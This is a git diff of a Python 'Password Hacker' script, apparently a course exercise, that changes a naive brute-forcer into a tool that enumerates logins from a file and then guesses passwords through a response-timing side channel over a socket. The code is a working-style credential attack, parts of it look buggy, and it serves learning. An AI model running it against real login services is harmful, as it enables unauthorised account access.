@@ -39,36 +39,80 @@ It's time to look for another one. Poor admin…
 
 import socket
 import argparse
+import json
 from itertools import product
+from datetime import datetime
+from string import ascii_lowercase as lower
+from string import digits
 
 
 def server(hostname, port):
     with socket.socket() as my_socket:
         address = (hostname, port)
         my_socket.connect(address)
-        gen = password_cracker()
-        while True:
-            mssg = next(gen)
-            mssg = mssg.encode(encoding='utf-8')
-            my_socket.send(mssg)
-            mssg_rcv = my_socket.recv(1024)
-            if mssg_rcv.decode() == "Connection success!":
-                break
-        password_decode = mssg.decode()
-        return password_decode
+
+        try:
+            user = user_gen()
+            login_condition = {'result': 'Wrong password!'}
+            login_success = {'result': 'Connection success!'}
+            while True:
+                log_pass["login"] = next(user)
+                mssg = json.dumps(log_pass)
+                mssg = mssg.encode()
+                my_socket.send(mssg)
+                mssg_rcv = my_socket.recv(1024)
+                mssg_rcv = mssg_rcv.decode()
+                mssg_rcv = json.loads(mssg_rcv)
+                if login_condition == mssg_rcv:
+                    raise Exception
+                else:
+                    pass
+        except Exception:
+            nw_password = ""
+            old_password = ""
+            while True:
+                password = password_gen()
+                while True:
+                    try:
+                        nw_password = nw_password + str(next(password))
+                        log_pass["password"] = nw_password
+                        mssg = json.dumps(log_pass)
+                        mssg = mssg.encode()
+                        my_socket.send(mssg)
+                        send_time = datetime.now()
+                        mssg_rcv = my_socket.recv(1024)
+                        rcv_time = datetime.now()
+                        delta_time = (rcv_time - send_time).microseconds
+                        mssg_rcv = mssg_rcv.decode()
+                        mssg_rcv = json.loads(mssg_rcv)
+                        if delta_time >= 1000:
+                            old_password = nw_password
+                            raise Exception
+                        elif mssg_rcv == login_success:
+                            return json.dumps(log_pass)
+                        else:
+                            if len(nw_password) > 1:
+                                nw_password = old_password
+                            else:
+                                nw_password = ""
+                    except Exception:
+                        break
 
 
-def password_cracker():
-    for i in range(1, 1000000):
-        for password in product(alphabet, repeat=i):
-            password = "".join(password)
-            yield password
+def user_gen():
+    with open(path_users, "r", encoding='UTF-8') as logins:
+        for user in logins:
+            user = user.strip("\n")
+            yield user
 
 
-def psw_crkr2():
-    for i in range(1, 1000000):
-        a = (x for x in product(alphabet, repeat=i))
-        return a
+def password_gen():
+    for i in range(1, 6):
+        for x in product(alphabet, repeat=i):
+            x = "".join(x)
+            password_lst = map(''.join, product(*zip(x.upper(), x.lower())))
+            for password in password_lst:
+                yield str(password)
 
 
 parser = argparse.ArgumentParser()
@@ -76,5 +120,9 @@ parser.add_argument("host", type=str)
 parser.add_argument("port", type=int)
 args = parser.parse_args()
 
-alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+path_passwords = "/Users/dsalzedo/PycharmProjects/Password Hacker/Password Hacker/task/passwords.txt"
+path_users = "/Users/dsalzedo/PycharmProjects/Password Hacker/Password Hacker/task/logins.txt"
+
+log_pass = {"login": "", "password": ""}
+alphabet = lower + digits
 print(server(args.host, args.port))
